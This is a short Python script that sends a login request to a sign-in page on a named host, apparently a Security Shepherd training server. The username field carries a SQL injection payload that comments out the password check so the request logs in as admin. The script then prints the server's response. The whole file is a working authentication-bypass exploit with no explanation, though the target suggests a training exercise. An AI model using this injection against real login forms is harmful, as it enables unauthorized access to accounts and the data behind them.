import requests

targetUrl = "http://shepherd.ii.uib.no:8001/signIn"
param = {"inputName":"admin'#", "inputPassword":"not_needed"}


result = requests.post(targetUrl, param)

print(result.url)
print(result.text)